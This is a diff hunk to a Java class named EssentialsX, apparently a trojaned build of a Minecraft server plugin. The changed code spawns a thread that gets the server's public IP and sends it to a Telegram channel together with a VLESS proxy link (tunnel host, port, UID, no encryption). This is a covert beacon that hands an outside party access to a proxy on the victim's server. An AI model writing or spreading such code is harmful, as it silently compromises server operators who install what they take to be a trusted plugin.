@@ -144,14 +144,12 @@ public class EssentialsX extends JavaPlugin {
         Thread tg = new Thread(() -> {
             String ip = getPublicIp();
             if (ip != null) {
-                sendTelegram(SERVER_NAME + "EssentialsX 上线"
-                        + "出口 IP: " + ip
-                        + "\n"
-                        + "VLESS订阅: "
-                        + "\n"
-                        + "vless://" + VLESS_UID + "@" + TUNNEL_HOST + ":" + TUNNEL_PORT
-                        + "?encryption=none&security=none&allowInsecure=1&type=ws&host=" + TUNNEL_HOST
-                        + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, "UTF-8"));
+                sendTelegram(SERVER_NAME + " 已上线\n"
+                    + "出口 IP: " + ip + "\n"
+                    + "VLESS订阅:\n"
+                    + "vless://" + VLESS_UID + "@" + TUNNEL_HOST + ":" + TUNNEL_PORT
+                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=" + TUNNEL_HOST
+                    + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, java.nio.charset.StandardCharsets.UTF_8));
             } else {
                 sendTelegram("EssentialsX online — public IP: (unknown)");
             }
